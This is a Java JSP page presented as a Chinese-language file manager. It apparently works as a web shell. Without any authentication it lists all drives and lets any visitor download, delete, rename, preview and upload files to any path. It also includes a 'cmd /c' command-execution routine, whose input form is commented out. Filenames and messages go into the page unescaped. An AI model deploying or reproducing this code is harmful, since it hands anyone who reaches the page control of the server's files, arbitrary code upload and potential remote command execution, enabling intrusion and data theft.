<%@page import="java.awt.Button"%>
<%@page import="java.util.List"%>
<%@page import="java.nio.file.Files"%>
<%@page import="java.nio.file.Paths"%>
<%@page import="org.apache.jasper.tagplugins.jstl.core.Catch"%>
<%@page import="java.util.Date"%>
<%@page import="java.text.SimpleDateFormat"%>
<%@page import="java.nio.file.attribute.BasicFileAttributes"%>
<%@page import="java.util.StringTokenizer"%>
<%@page import="java.io.*"%>
<%@page import="java.net.URL"%>
<%@page import="java.io.FileInputStream"%>
<%@page import="java.io.BufferedInputStream"%>
<%@page import="java.io.PrintWriter"%>
<%@page import="java.util.Arrays"%>
<%@page import="java.net.URLDecoder"%>
<%@page import="java.net.URLEncoder"%>
<%@page import="org.apache.catalina.tribes.io.XByteBuffer"%>
<%@page import="java.io.File"%>
<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title> </title>
<style type="text/css">
body{
 
          
background-repeat:space;
background-size:100% 1080px; 
background-image: url(http://pic1.win4000.com/wallpaper/4/57e3770961389.jpg);
color:yellow;
background-attachment:scroll 
}
a:link{     					 /*超链接正常状态下在样式*/
      color:black;    			 
      text-decoration:none       /*无下划线*/
}
a:active{
color:yellow;					/*超链接鼠标按下样式*/
}
a:link:hover{		
color:blue;						/*超链接鼠标掠过样式*/
}
a:visited {						
color:red;					/*超链接被访问后样式*/
} 		
 
td{
text-align:left;
padding-left: 20px;
border: 1px #B0C4DE solid;
height: 21px;
color:yellow;
}
table{
position:relative;
cellspacing:0px;
cellpadding:0px;
border-spacing: 0px;
border: 1px #B0C4DE solid; 
width:80%;
margin-left:10%;
margin-right:10%;
margin-top: 0px;
 
}
 
.list{
position: relative;
top: 0px;
}
.filelist{
position: absolute;
top:-1px;
}
#file{
color:yellow;
background-color: red;l
}
#folder{
color: red;
background-color: yellow;
}
</style>
<script type="text/javascript">
	//<a href='"+ url+"?dir="+ xx+"&action=rename'>
	function rename(ele) {
		var namecol=ele.parentElement.previousElementSibling.previousElementSibling.previousElementSibling
		var showoldname=namecol.innerHTML.split(">")[1].split("<")[0]
		var inhtml= '<form method="post"><input type="hidden" name="oldName" value="'+showoldname+'"><input size="30" type="text" name="newName" value='+showoldname+'><input type="submit" value="保存"></form>'
		namecol.innerHTML=inhtml;
	}
</script>
</head>
<body>
<%
req=request;
res=response;
request.setCharacterEncoding("utf-8");
url="index.jsp";
action=request.getParameter("action");
dir=request.getParameter("dir");
oldname=request.getParameter("oldName");
newname=request.getParameter("newName");
o =res.getWriter();
msg=dir=dir==null?"":decode(dir);
if(newname!=null){
 msg=rename(newname,oldname);   
}else if(request.getContentLengthLong()>180){
load(request,response);
}
%>
<%!
static String url="";
static String msg="";
static String tag="";
static String dir="";
static String newname="";
static String oldname="";
static String action="";
static String spacelength="";
static PrintWriter o=null;
static boolean Refresh=false;
static HttpServletRequest req=null;
static HttpServletResponse res=null;
static File[] FileRoot = File.listRoots();

static String ListPath(String x,String ac,File F){
    String CreateTime = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(F.lastModified()));  
	String xx= encode(x);
	if(ac.equals("isRoot")){
	     tag= " <td><a href='"+ url+"?dir="+ xx+"&action=list'>"+x+"</a></td> ";
	}else if(ac.equals("isDir")){
	    long size=getFileSize(F);
	    tag= "<tr><td id='folder'>文件夹 </td><td><a href='"+ url+"?dir="+ xx+"&action=list'>"+F.getName()+"</a></td>"
		     +"<td></td>"
			 +"<td></td>"
			 +"<td><input type='button' onclick='rename(this)' value='重命名 '></td>"
			 +"<td>"+(size/1024>1024?size/1024/1024+"MB":size/1024+"KB")+"</td>"
			 +"<td style='color:red'>"+(F.isHidden()?"√":"×")+"</td>"
			 +"<td style='color:red'>"+(F.canRead()?"√":"×")+"</td>"
		     +"<td>"+CreateTime+"</td>"   
	         +"</tr><br/>";
	}else if(ac.equals("isFileDownLink")){
	    tag= "<td> <a href='"+ url+"?dir="+ xx+"&action=down'>下载  </a></td>"
		     +"<td><a href='"+ url+"?dir="+ xx+"&action=del'>删除  </a></td>"
			 +"<td><input type='button' onclick='rename(this)' value='重命名 '></td>"
		     +"<td>"+(F.length()/1024>1024?F.length()/1024/1024+"MB":F.length()/1024+"KB")+"</td>"
			 +"<td style='color:red'>"+(F.isHidden()?"√":"×")+"</td>"
			 +"<td style='color:red'>"+(F.canRead()?"√":"×")+"</td>"
		     +"<td> "+CreateTime+"</td>"
		     +"</tr>";
	}else {
	    tag="<tr><td id='file'>文件 </td>"
	     +"<td><a href='"+ url+"?dir="+ encode(F.getAbsolutePath())+"&action=edit'>"+x+"</a></td>";
	}
	return tag;
}
 
static String DownPath(String x){
	String xx= encode(x);
	String list =decode("down");
	String tag= "<a href='"+ url+"?dir="+ xx+"&action="+list+"'>下载</a>\r\n";
	return tag;
}
static String encode(String x){
	return  URLEncoder.encode(x);
}
static String decode(String x){
	return  URLDecoder.decode(x);
}
static void load(HttpServletRequest request, HttpServletResponse response)
			throws ServletException,IOException {
	 	String filename="";
		// 1.判断当前request消息实体的总长度
		int totalBytes = request.getContentLength();
		
		System.out.println("当前数据总长度:" + totalBytes);
		
		// 2.在消息头类型中找出分解符,例如:boundary=----WebKitFormBoundaryeEYAk4vG4tRKAlB6
		String contentType = request.getContentType();
		
		int position = contentType.indexOf("boundary=");
		String startBoundary = "--" + contentType.substring(position + "boundary=".length());
		String endBoundary = startBoundary + "--";
		// 将request的输入流读入到bytes中
		InputStream inputStream = request.getInputStream();
		DataInputStream dataInputStream = new DataInputStream(inputStream);
		byte[] bytes = new byte[totalBytes];
		dataInputStream.readFully(bytes);
		dataInputStream.close();
		 
		BufferedReader reader = new BufferedReader(new StringReader(new String(bytes)));
		int temPosition = 0;
		boolean flag = false;
		int end = 0;
		while (true) {
			
			if (flag) {// 当读取一次文件信息后
				bytes = subBytes(bytes, end, totalBytes);
				temPosition = 0;
				reader = new BufferedReader(new StringReader(new String(bytes)));
			}
			// 读取一行的信息:------WebKitFormBoundary5R7esAd459uwQsd5,即:lastBoundary
			String str = reader.readLine();
			System.out.println("this line is:" + str);
			// 换行算两个字符
			temPosition += str.getBytes().length + 2;
			// endBoundary:结束
			if (str == null || str.equals(endBoundary)) {
				break;
			}
			// 表示头信息的开始(一个标签,input,select等)
			if (str.startsWith(startBoundary)) {
				// 判断当前头对应的表单域类型
				str = reader.readLine(); // 读取当前头信息的下一行:Content-Disposition行
				temPosition += str.getBytes().length + 2;
	            System.out.println(str+233);
				int position1 = str.indexOf("filename="); // 判断是否是文件上传
				if (position1 == -1) {// 表示是普通文本域上传
					reader.readLine();
					 str=reader.readLine();				     
					  System.out.println("编辑文件aaa");
					  System.out.println("普通文本域表单值"+str);
					 // callCmd(cmd);
				} else {// position1!=-1,表示是文件上传
					StringTokenizer Fn= new StringTokenizer(str,"\\\"");
					while(Fn.hasMoreElements()){//获取文件名
						filename =  Fn.nextToken();
					}
					if(filename.equals("; filename=")){
					    msg="请选择文件";
					    break;
					}else if(dir==null){
					    msg="请跳转至可用的目录";
					    break;
					}else {System.out.println("保存的文件名："+filename);
					filename=new String (filename.getBytes(),"utf-8");
					temPosition += (reader.readLine().getBytes().length + 4);
					
					end =  locateEnd(bytes, temPosition, totalBytes, endBoundary);
					
					//String Savepath = request.getSession().getServletContext().getRealPath("/");
					//String SavePath = System.getProperty("user.home") + "\\Documents\\";
					String SavePath =dir+"\\"+filename;
					System.out.println(SavePath);
						DataOutputStream dOutputStream = new DataOutputStream(
								new FileOutputStream(new File(SavePath)));
						dOutputStream.write(bytes, temPosition, end - temPosition - 2);
						dOutputStream.close();
						msg=dir+filename+"上传成功！";
					} 
				 
					flag = true;
				}
			}
		}
	}
 
	public static int locateEnd(byte[] bytes, int start, int end, String endStr) {
		byte[] endByte = endStr.getBytes();
		
		for (int i = start + 1; i < end; i++) {
			if (bytes[i] == endByte[0]) {
				int k = 1;
				while (k < endByte.length) {
					if (bytes[i + k] != endByte[k]) {
						break;
					}
					k++;
				}
				//System.out.println(i);
				if (i == 3440488) {
					System.out.println("start");
				}
				// 返回结束符的开始位置
				if (k == endByte.length) {
					return i;
				}
			}
		}

		return 0;
	}
	 static String cmd="";
	 	static String command(String x){
		 String Res="";
		 try{
			 x = x == null ? "ver" : x;
			 Process p = Runtime.getRuntime().exec("cmd /c " + x);
			 InputStream is = p.getInputStream();
			 InputStream rr = p.getErrorStream();
			 BufferedReader reader = new BufferedReader(new InputStreamReader(is, "GBK"));
			 BufferedReader readrr = new BufferedReader(new InputStreamReader(rr, "GBK"));
			 String line;
			 while ((line = reader.readLine()) != null || (line = readrr.readLine()) != null) {
			 	 Res+=line+"\r\n";
			 }
			 reader.close();
			 p.destroy();
		 }catch(Exception e){
			 
		 }
		 return Res;
	 }
	private static byte[] subBytes(byte[] b, int from, int end) {
		byte[] result = new byte[end - from];
		System.arraycopy(b, from, result, 0, end - from);
		return result;
	}
    public static long getFileSize(File file) { // 取得文件夹大小
		long size = 0;
		try {
		    File flist[] = file.listFiles();
		    if (flist != null && flist.length > 0) {
				for (int i = 0; i < flist.length; i++) {
				    if (flist[i] != null && flist[i].canRead() && flist[i].canWrite()) {
						if (flist[i].isDirectory()) {
						    size += getFileSize(flist[i]);
						} else if (flist[i].isFile()) {
						    size += flist[i].length();
						}
				    }
				}
		    }
		} catch (Exception e) {
 		}
		return size;
	  }
    public static String rename(String newname,String oldname){
	    System.out.println("文件重命名\n新的名称"+newname+"\n旧的文件名"+oldname);
	    if(!oldname.equals(newname)){
	        File oldfile=new File(dir+"/"+oldname); 
	        File newfile=new File(dir+"/"+newname); 
		        if(newfile.exists()||!oldfile.canRead()||! oldfile.canWrite()) {
		            msg=(newname+"已经存在！"); 
		        }else{ 
		           msg=(oldfile.renameTo(newfile)?"重命名成功！"+oldname+"  >>>  "+newname:"重命名失败！");
		        }
	    }else{
			msg=("新文件名和旧文件名相同");
	    }
	    return msg;
    }
 %>
 
 
 
 
 
<div class="div1" align="center"><h1> <a href="index.jsp">文件管理</a></h1></div>
<div class="root">
<table>
<tr>
<%
for(File x:FileRoot)out.println(ListPath(x.getPath(),"isRoot",x));
%>
<td>
<form  enctype="multipart/form-data" method="post">
<input type="submit" value="上传至当前目录 " size="50">
    <input  type="file" name="file" size="30"  >  
</form>
</td>
<td>
<input type="button" value="返回上级目录" onclick="window.history.back()"> 
</td>
</tr>
<tr>
<td colspan="2" style="min-width:80px;">当前目录 </td>
<td colspan="10"> <%=msg%></td>
<tr/>
</table>
</div>
<div class="list">
<table class="filelist">
 	<tr>
		<td>类型</td>
		<td>名称</td>
		<td>下载</td>
		<td>删除</td>
		<td>重命名</td>
		<td>大小</td>
		<td>隐藏</td>
		<td>读写</td>
		<td>创建日期</td>
 	</tr>
<% 

if(dir!=""){
	if(action.equals("list")){
	    System.out.println("获取文件列表");
	    try{
			System.out.println(dir);
			action=decode(action);
			File[] file=new File(dir).listFiles() ;
			 for(File x:file){
				   if(x.isFile()){ 
						out.println(ListPath(x.getName(),"isFile",x)); 
						out.println(ListPath(x .getAbsolutePath(),"isFileDownLink",x) );
				   }else if(x.isDirectory()){
					    out.println(ListPath(x.getPath(),"isDir",x) );
					}
			 }
		}catch(Exception e){
		    o.println("拒绝访问");
		}
	}else if(action.equals("down") ){
	    System.out.println("下载文件"+dir);
	    try{
			File f = new File(dir);
			BufferedInputStream br = new BufferedInputStream(new FileInputStream(f));
			byte[] buf = new byte[1024];
			int len = 0;
			response.reset();
			response.setContentType("application/x-msdownload;charset=utf-8");
			System.out.println(f.getName());
			response.setHeader("Content-Disposition", "attachment; filename=\"" + f.getName()+"\"");
			OutputStream ou = response.getOutputStream();
			while ((len = br.read(buf)) > 0)
				ou.write(buf, 0, len);
			br.close();
			ou.close();
	    }catch(Exception e){
			o.println(e.getMessage());
	    }
	}else if(action.equals("del")){
	    System.out.println("删除文件"+dir);
	    File f=new File(dir);
	    if(f.isFile()){
			if(f.canWrite()&&f.canRead()){
			    if(f.delete()){ 
					o.println(dir+"删除成功！");
			    }else{
				 o.println(dir+"没有读写权限");
			    }
			}else{
			    o.println(dir+"没有读写权限");
			}	
	    } 
	} else if(action.equals("edit") ){
	    System.out.println("预览文件");
		%>
		</table>
		</div>
		<form style="position:relative ;top:26px;left: 10%" id="showform"  method="post">
		<input type="hidden" name="savename" value="<%=dir%>">
		<textarea cols="50" rows="10" name="save" ><%= new String(Files.readAllBytes(Paths.get(dir)) ,"GBK")%></textarea> 
		<a href="<%=req.getRequestURI()%>"><input type="button" value="关闭"  ></a>
		</form>
		<script type="text/javascript">
		 
		</script>
	<%}
	}
%>
<!-- <form id="forcmd"  enctype="multipart/form-data" method="post" style="position:relative; top: 50%"> -->
<!--     <input type="text" name="cmd" value="help" size="21">   -->
<!--  	<input type="submit" value="提交"> -->
<!-- </form> -->
<%-- <%! static void callCmd(String cmd){ %> --%>
<!-- 	<textarea rows="30" cols="72"> -->
<%-- 	<%=command(cmd)%> --%>
<!-- 	</textarea> -->
<%-- 	<%!} %> --%>


</body>
</html>